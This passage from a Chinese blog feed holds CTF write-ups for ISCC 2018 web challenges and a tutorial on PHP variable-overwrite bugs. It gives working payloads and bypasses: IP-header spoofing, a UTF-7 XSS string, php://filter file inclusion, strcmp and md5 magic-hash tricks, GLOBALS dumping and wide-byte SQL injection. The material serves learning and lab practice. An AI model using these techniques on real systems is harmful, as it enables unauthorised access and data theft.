class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F;print_r($_SERVER);</span><br><span class="line">$arr&#x3D;explode(&#39;,&#39;,$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">if($arr[0]&#x3D;&#x3D;&#39;127.0.0.1&#39;)&#123;</span><br><span class="line">    &#x2F;&#x2F;key</span><br><span class="line">    echo &quot;key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;必须从本地访问！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h5 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h5><p>提示：xss<br>题目：<a href="http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=+/v+%20+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-&amp;_=1302746925413">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</a><br>发现和实验吧的xss题有点类似<br>对网址进行转义，发现其中有段base64编码   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;NodeMore.jsp?id&#x3D;672613&amp;page&#x3D;2&amp;pageCounter&#x3D;32&amp;undefined&amp;callback&#x3D;+&#x2F;v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-&amp;_&#x3D;1302746925413 </span><br></pre></td></tr></table></figure><p>看到类似“+/v+ +ADwAcwBjAHIAaQBwA”想到了UTF-7编码<br><a href="http://web2hack.org/xssee/">xssee</a>  在线解码得到 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;NodeMore.jsp?id&#x3D;672613&amp;page&#x3D;2&amp;pageCounter&#x3D;32&amp;undefined&amp;callback&#x3D;+&#x2F;v+ &lt;script&gt;alert(&quot;key:&#x2F;%nsfocusXSStest%&#x2F;&quot;)&lt;&#x2F;script&gt;-&amp;_&#x3D;1302746925413 </span><br></pre></td></tr></table></figure><p>将/%nsfocusXSStest%/输入提交框，弹出弹框：恭喜你！flag{Hell0World}  </p><h5 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h5><p>提示：好像有个文件忘记删了&amp;flag is here<br>应该是备份文件泄露<br>找到文件泄露地址<br><a href="http://118.190.152.202:8009/index.php.txt">http://118.190.152.202:8009/index.php.txt</a><br>得到PHP代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] !&#x3D; &quot;POST&quot;)</span><br><span class="line">die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k &#x3D;&gt; $v)&#123;</span><br><span class="line">$$k &#x3D; $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k &#x3D;&gt; $v)&#123;</span><br><span class="line">$$k &#x3D; $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !&#x3D;&#x3D; $flag )</span><br><span class="line">die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>又是代码审计<br>看到$$想到了变量覆盖漏洞，这类漏洞也常常和foreach联系在一起<br>post:flag=flag<br>get:?_200=flag<br>post传入变量使得flag变量的值为flag，绕过比较<br>get传参将flag变量的值赋值给_200，最后打印出来<br>得到flag：flag ISCC{taolu2333333….}  </p><h5 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h5><p>刚开始以为是SQL注入，一直再瞎搞，后面经过朋友提示知道里是文件包含，PHP伪协议</p><p><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1">推荐文章PHP伪协议</a><br>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>php://filter 参数  </p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（_</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（_</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr><tr><td>利用PHP://filter过滤器读取index.php的代码，刚开始测试点是id，发现应该不是这里，再测试了f：</td><td></td></tr><tr><td><a href="http://118.190.152.202:8008/index.php?f=php://filter/read=convert.base64-encode/resource=index.php&amp;id=4">http://118.190.152.202:8008/index.php?f=php://filter/read=convert.base64-encode/resource=index.php&amp;id=4</a></td><td></td></tr><tr><td><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgsmnsabfj30x408odgd.jpg" alt="image"></td><td></td></tr><tr><td>报错。。。</td><td></td></tr><tr><td>后面发现过滤了php字符</td><td></td></tr><tr><td>修改：<a href="http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=4">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=4</a> （至于为什么要将index后面的.php删掉不太清楚）</td><td></td></tr><tr><td>后面看了代码</td><td></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;å¯¼èªé¡µ&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href&#x3D;&#39;index.php?f&#x3D;articles&amp;id&#x3D;1&#39;&gt;ID: 1&lt;&#x2F;href&gt;</span><br><span class="line">    &lt;&#x2F;br&gt;</span><br><span class="line">    &lt;a href&#x3D;&#39;index.php?f&#x3D;articles&amp;id&#x3D;2&#39;&gt;ID: 2&lt;&#x2F;href&gt;</span><br><span class="line">    &lt;&#x2F;br&gt;</span><br><span class="line">    &lt;a href&#x3D;&#39;index.php?f&#x3D;articles&amp;id&#x3D;3&#39;&gt;ID: 3&lt;&#x2F;href&gt;</span><br><span class="line">    &lt;&#x2F;br&gt;</span><br><span class="line">    &lt;a href&#x3D;&#39;index.php?f&#x3D;articles&amp;id&#x3D;4&#39;&gt;ID: 4&lt;&#x2F;href&gt;</span><br><span class="line">    &lt;&#x2F;br&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">    #ISCC&#123;LFIOOOOOOOOOOOOOO&#125;</span><br><span class="line">    if(isset($_GET[&#39;f&#39;]))&#123;</span><br><span class="line">        if(strpos($_GET[&#39;f&#39;],&quot;php&quot;) !&#x3D;&#x3D; False)&#123;</span><br><span class="line">            die(&quot;error...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            include($_GET[&#39;f&#39;] . &#39;.php&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码中过滤了php字符，并且会在f参数后加上.php，明白了</p><h5 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h5><p>提示：错误！你的IP不是本机ip！<br>应该还是IP伪造<br>试了最常见的几个伪造ip响应头文件都不行      X-Forwarded-For<br>X-Client-IP<br>X-Real-IP<br>CDN-Src-IP  …<br>后面试了一下Client-IP ，成了<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frgweq2o3uj30ta06qdgk.jpg" alt="image">    </p><h5 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h5><p>页面显示：Please give me username or password!<br>那我们就get传参username和password先试一下<br><a href="http://118.190.152.202:8017/?username=1&amp;password=1000">http://118.190.152.202:8017/?username=1&amp;password=1000</a><br>查看代码发现  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username is not right&lt;!--index.php.txt--&gt;&lt;p&gt;Password too long&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>打开index.php.txt发现PHP代码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&#39;username&#39;]))&#123;</span><br><span class="line">if (0 &#x3D;&#x3D; strcasecmp($flag,$_GET[&#39;username&#39;]))&#123;</span><br><span class="line">$a &#x3D; fla;</span><br><span class="line">echo &quot;very good!Username is right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;Please give me username or password!&#39;;</span><br><span class="line">if (isset($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">if (is_numeric($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">if (strlen($_GET[&#39;password&#39;]) &lt; 4)&#123;</span><br><span class="line">if ($_GET[&#39;password&#39;] &gt; 999)&#123;</span><br><span class="line">$b &#x3D; g;</span><br><span class="line">print &#39;&lt;p&gt;very good!Password is right&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else </span><br><span class="line">print &#39;&lt;p&gt;Password too little&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;&lt;p&gt;Password too long&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;else</span><br><span class="line">print &#39;&lt;p&gt;Password is not numeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b &#x3D;&#x3D; &quot;flag&quot;)</span><br><span class="line">print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (0 &#x3D;&#x3D; strcasecmp($flag,$_GET[&#39;username&#39;]))&#123;</span><br><span class="line">$a &#x3D; fla;</span><br><span class="line">echo &quot;very good!Username is right&quot;;</span><br></pre></td></tr></table></figure><p>这一段要求flag变量值要与username参数值相同，我们可以利用strcasecmp函数传入非法参数报错返回0绕过 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (is_numeric($_GET[&#39;password&#39;]))&#123;</span><br><span class="line">if (strlen($_GET[&#39;password&#39;]) &lt; 4)&#123;</span><br><span class="line">if ($_GET[&#39;password&#39;] &gt; 999)&#123;</span><br><span class="line">$b &#x3D; g;</span><br><span class="line">print &#39;&lt;p&gt;very good!Password is right&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure><p>这一段是要求password的长度要小于4，但是值却要大于999，这里我们可以用科学计数法绕过<br>构造<a href="http://118.190.152.202:8017/index.php/?username%5B%5D=1&amp;password=9E9">http://118.190.152.202:8017/index.php/?username[]=1&amp;password=9E9</a><br>得到flag：flag{ISCC2018_Very_GOOD!}  </p><h5 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h5><p>又是一道代码审计的题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;md5.php&quot;  method&#x3D;&quot;post&quot; &gt;</span><br><span class="line">    用户名:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&#x2F;&gt;</span><br><span class="line">    密码:&lt;input type&#x3D;&quot;password&quot; name &#x3D;&quot;password&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">if(isset($_POST[&#39;username&#39;])&amp;isset($_POST[&#39;password&#39;]))&#123;</span><br><span class="line">    $username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $username&#x3D;&quot;hello&quot;;</span><br><span class="line">    $password&#x3D;&quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if(md5($password) &#x3D;&#x3D; 0)&#123;</span><br><span class="line">    echo &quot;xxxxx&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>要求的是post传入username和password两个参数，password参数的md5值要等于0<br><a href="https://www.cnblogs.com/Primzahl/p/6018158.html">推荐文章PHP处理0e开头md5哈希字符串缺陷/bug</a><br>输入框输入username=1，password=QNKCDZO得到  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NULL &lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$a &#x3D; @$_REQUEST[&#39;a&#39;];</span><br><span class="line">str_replace(&quot;&#123;&quot;,&quot;&quot;,$a);</span><br><span class="line">str_replace(&quot;&#125;&quot;,&quot;&quot;,$a);</span><br><span class="line">@eval(&quot;var_dump($$a);&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>这里又是$$变量覆盖漏洞使用全局数组变量GLOBALS打印出所有变量值<br><a href="http://118.190.152.202:8005/no_md5.php?a=GLOBALS">http://118.190.152.202:8005/no_md5.php?a=GLOBALS</a><br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frgxmdmw8uj31f90c8goc.jpg" alt="image">  </p><h5 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h5><p>找到个人信息处应该是宽字节注入，<a href="http://118.190.152.202:8015/index.php?id=1%27%EF%BF%BD">http://118.190.152.202:8015/index.php?id=1%27%df</a><br>利用SQLmap得到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ISCC-CTF小计（更新中）&quot;&gt;&lt;a href=&quot;#ISCC-CTF小计（更新中）&quot; class=&quot;headerlink&quot; title=&quot;ISCC CTF小计（更新中）&quot;&gt;&lt;/a&gt;ISCC CTF小计（更新中）&lt;/h3&gt;&lt;p&gt;上周经班上同学说起，才知道最近有个信
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ctf" scheme="http://yoursite.com/child/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>变量覆盖漏洞</title>
    <link href="http://yoursite.com/child/2018/05/14/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/child/2018/05/14/变量覆盖漏洞/</id>
    <published>2018-05-14T03:35:12.000Z</published>
    <updated>2018-05-18T07:57:02.081Z</updated>
    
    <content type="html"><![CDATA[<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值<br><a href="http://www.freebuf.com/column/150731.html">推荐阅读代码审计|变量覆盖漏洞 </a>  </p><h5 id="1-exartact函数"><a href="#1-exartact函数" class="headerlink" title="1.exartact函数"></a>1.exartact函数</h5><p>exartact（）函数的作用是从传入数组中将变量导入当前符号表中，键名是变量名，键值是变量值。</p><p>注：符号表是记录符号属性的表,它的每一表项表示一个标识符的属性信息.这些属性信息通常包括种类(常数,变量,数组,标号等),类型(整型,实型,逻辑型,字符型等),给名字分配的存储单元地址等。  </p><p>该函数有三个参数var_array（必须，规定输入）、extract_type（可选，检查每个键名是否为合法变量）、prefix</p><p>该函数出现变量覆盖漏洞通常有两种情况：<br>（1）二参为EXTR_OVERWRITE,它表示有冲突时覆盖已有变量<br>（2）只有一参，默认二参为EXTR_OVERWRITE</p><p>这道变量覆盖的ctf题中，extract函数是获取post传参后的以数组形式传入符号表，我们post传入pass=0&amp;thepassword_123=0，将thepassword_123变量值赋值为0</p><h5 id="2-parse-str函数"><a href="#2-parse-str函数" class="headerlink" title="2.parse_str函数"></a>2.parse_str函数</h5><p>该函数作用是解析字符串并且注册成变量，在注册变量之前不会验证变量是否已经存在，直接覆盖<br>语法：<br>parse_str(string,array)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b&#x3D;1;</span><br><span class="line">parse_str(&#39;b&#x3D;2&#39;);</span><br><span class="line">print_r(%$b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出的b的值变为了2  </p><p>例：某ctf  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] !&#x3D; ‘QNKCDZO’ &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(‘QNKCDZO’)) &#123;</span><br><span class="line">   echo $flag;</span><br><span class="line">PAYLOAD： ?id&#x3D;a[0]&#x3D;240610708</span><br></pre></td></tr></table></figure><h5 id="3-import-request-variables函数"><a href="#3-import-request-variables函数" class="headerlink" title="3.import_request_variables函数"></a>3.import_request_variables函数</h5><p>该函数是把GET,POST,COOKIE的参数注册为变量，用在register_globals被禁止的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variables ( string $types [, string $prefix ] )</span><br></pre></td></tr></table></figure><p>　　$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; 1;    &#x2F;&#x2F;原变量值为1</span><br><span class="line">import_request_variables(&#39;GP&#39;);   &#x2F;&#x2F;传入参数时注册变量</span><br><span class="line">print_r($a);  &#x2F;&#x2F;输出结果为2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="4.$$变量覆盖"></a>4.$$变量覆盖</h5><p>$$常常用在foreach函数中<br>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;?name&#x3D;test</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;output:string(4) “name” string(4) “test” string(4) “test” test</span><br><span class="line"></span><br><span class="line">$name&#x3D;’thinking’;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value)</span><br><span class="line"></span><br><span class="line">$$key &#x3D; $value;#$key&#x3D;name,$$key&#x3D;$name</span><br><span class="line"></span><br><span class="line">var_dump($key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump($value);</span><br><span class="line"></span><br><span class="line">var_dump($$key);</span><br><span class="line"></span><br><span class="line">echo $name;#会输出test</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>foreach函数将get参数存入数组，我们构造payload：<strong>index.php?name=meizijiu233</strong>，name作为变量存入，$$key=$name=meizijiu233；判断通过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;变量覆盖漏洞&quot;&gt;&lt;a href=&quot;#变量覆盖漏洞&quot; class=&quot;headerlink&quot; title=&quot;变量覆盖漏洞&quot;&gt;&lt;/a&gt;变量覆盖漏洞&lt;/h3&gt;&lt;p&gt;变量覆盖指的是用我们自定义的参数值替换程序原有的变量值&lt;br&gt;&lt;a href=&quot;http://www.fre
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ctf" scheme="http://yoursite.com/child/tags/ctf/"/>
    
      <category term="web" scheme="http://yoursite.com/child/tags/web/"/>
    
      <category term="变量覆盖" scheme="http://yoursite.com/child/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
  </entry>
  
  <entry>
    <title>代码审计类ctf记录</title>
    <link href="http://yoursite.com/child/2018/05/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B1%BBctf%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/child/2018/05/09/代码审计类ctf记录/</id>
    <published>2018-05-09T03:35:12.000Z</published>
    <updated>2018-05-18T07:55:15.144Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-php-strcmp-漏洞"><a href="#1-php-strcmp-漏洞" class="headerlink" title="1.php strcmp()漏洞"></a>1.php strcmp()漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure><p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0<br>该漏洞是用于php5.3之前的版本<br>该函数要求是上传字符串进行比较，当我们传入非法参数时，如数组，在php5.3之前函数会报错，return 0！刚好和两个字符串相等返回0的结果一样  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$pass&#x3D;@$_POST[&#39;pass&#39;];</span><br><span class="line">$pass1&#x3D;***********;&#x2F;&#x2F;被隐藏起来的密码</span><br><span class="line">if(isset($pass))</span><br><span class="line">&#123;</span><br><span class="line">if(@!strcmp($pass,$pass1))&#123;</span><br><span class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;the pass is wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;please input pass!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:pass[]=1</p><h4 id="2-php-输入输出流"><a href="#2-php-输入输出流" class="headerlink" title="2.php://输入输出流"></a>2.php://输入输出流</h4><p>输入输出流主要包括三种：<br>php://input:直接读取post上没有经过解析的原始数据  </p><p>php://output：将post流数据输出  </p><p>php://filter：（常用在XXE漏洞中）文件操作协议，对磁盘文件进行读写，类似于readflie()、file()、flie_get_conments()  </p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fqa9q57w77j30ra08n3z7.jpg" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if(@file_get_contents($file) &#x3D;&#x3D; &quot;meizijiu&quot;)&#123;</span><br><span class="line">    echo $nctf;</span><br></pre></td></tr></table></figure><p>这道题要的是获取flie传入的文件，提取内容与meizijiu进行比较，我们可以利用php://input<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqa9y2go87j309s05o0sp.jpg" alt="image">  </p><h4 id="3-进制转换绕过"><a href="#3-进制转换绕过" class="headerlink" 